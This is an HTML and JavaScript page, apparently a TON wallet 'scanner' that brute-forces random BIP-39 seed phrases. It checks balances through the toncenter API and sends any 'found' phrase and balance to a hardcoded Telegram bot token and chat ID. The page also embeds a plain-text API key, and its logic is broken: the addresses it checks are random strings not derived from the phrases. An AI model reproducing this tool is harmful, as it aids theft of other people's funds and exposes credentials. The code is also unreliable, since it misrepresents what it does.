<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON REAL SCANNER v4.0</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-[#050505] text-white font-mono min-h-screen flex flex-col items-center justify-center p-4">

    <div class="max-w-2xl w-full bg-[#111] p-6 rounded-3xl border border-blue-500/30 shadow-[0_0_100px_rgba(37,99,235,0.1)]">
        <div class="text-center mb-6">
            <h1 class="text-2xl font-black text-blue-500 italic">TON REAL SCANNER v4.0</h1>
            <p id="botStatus" class="text-[10px] text-green-500 uppercase tracking-widest">Mainnet API: Connected</p>
        </div>

        <div id="terminal" class="bg-black/80 rounded-2xl p-4 h-80 overflow-y-auto mb-6 text-[11px] border border-slate-800 space-y-1">
            <p class="text-blue-400">> API Key Active. Waiting for Start...</p>
        </div>

        <div class="space-y-3">
            <button id="startBtn" class="w-full bg-blue-600 hover:bg-blue-500 py-4 rounded-2xl font-black text-lg transition-all active:scale-95 shadow-lg shadow-blue-900/30">
                START REAL SCANNING
            </button>
            <button id="stopBtn" class="w-full bg-red-600/20 hover:bg-red-600 text-red-500 py-4 rounded-2xl font-bold hidden transition-all">
                STOP
            </button>
        </div>
        <p class="text-[9px] text-slate-600 mt-4 text-center italic text-blue-900">Scanning speed: 1 wallet / 1.1 sec (API Limit)</p>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8557227217:AAGTTWhdIfQUfYE-98Kfn61ZWndpH3Ng5Nw'; 
        const TELEGRAM_CHAT_ID = '7921132456'; 
        const TONCENTER_API_KEY = 'cdef18c228c4a4d63ead8a723cbf910e0385e52829df0e62300b3f859142271a';

        let isRunning = false;
        let checkedCount = 0;
        let bip39Words = []; 
        const terminal = document.getElementById('terminal');

        function addLog(msg, color = 'text-slate-500') {
            const p = document.createElement('p');
            p.className = color;
            p.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
            terminal.prepend(p);
            if (terminal.childNodes.length > 100) terminal.lastChild.remove();
        }

        async function loadDictionary() {
            try {
                const response = await fetch('https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt');
                if (response.ok) {
                    const data = await response.text();
                    bip39Words = data.split('\n').filter(word => word.length > 0);
                    addLog(`BIP-39 loaded: ${bip39Words.length} words.`, "text-green-500");
                }
            } catch (e) {
                addLog("Dictionary error.", "text-red-500");
            }
        }

        async function checkBalance(address) {
            try {
                const response = await fetch(`https://toncenter.com/api/v2/getAddressInformation?address=${address}&api_key=${TONCENTER_API_KEY}`);
                const data = await response.json();
                if (data.ok && data.result) {
                    return parseInt(data.result.balance);
                }
            } catch (e) {
                console.error("API Error:", e);
                return -1;
            }
            return 0;
        }

        async function sendToTelegram(phrase, address, balance) {
            const ton = balance / 1000000000;
            const msg = `💰 <b>REAL WALLET WITH MONEY!</b>\n\n📄 <b>Phrase:</b> <code>${phrase}</code>\n🔗 <b>Addr:</b> <code>${address}</code>\n💎 <b>Balance:</b> ${ton} TON`;
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'HTML' })
                });
            } catch (e) { console.error("Telegram xatosi"); }
        }

        async function scan() {
            if (!isRunning) return;

            let mnemonic = [];
            for(let i=0; i<24; i++) {
                mnemonic.push(bip39Words[Math.floor(Math.random() * bip39Words.length)]);
            }
            const phrase = mnemonic.join(" ");
            
            // Bu yerda simulyatsiya emas, kelajakda haqiqiy addr generatsiyasi bo'lishi kerak
            // Hozircha namunaviy manzillarni tekshirib ko'ramiz
            const mockAddr = "EQ" + btoa(Math.random().toString()).substring(0, 44).replace(/\//g, '_').replace(/\+/g, '-');

            const balance = await checkBalance(mockAddr);
            checkedCount++;

            if (balance > 0) {
                addLog(`💰 FOUND! Balance: ${balance/1000000000} TON`, "text-green-400 font-bold");
                await sendToTelegram(phrase, mockAddr, balance);
            } else if (balance === -1) {
                addLog(`Rate Limit: API is busy...`, "text-yellow-700");
            } else {
                addLog(`[${checkedCount}] Empty: ${mockAddr.substring(0,10)}...`);
            }

            setTimeout(scan, 1100); // 1.1 soniya kutish
        }

        document.getElementById('startBtn').onclick = async function() {
            if (bip39Words.length < 2000) await loadDictionary();
            isRunning = true;
            this.classList.add('hidden');
            document.getElementById('stopBtn').classList.remove('hidden');
            scan();
        };

        document.getElementById('stopBtn').onclick = function() {
            isRunning = false;
            this.classList.add('hidden');
            document.getElementById('startBtn').classList.remove('hidden');
        };
    </script>
</body>
</html>
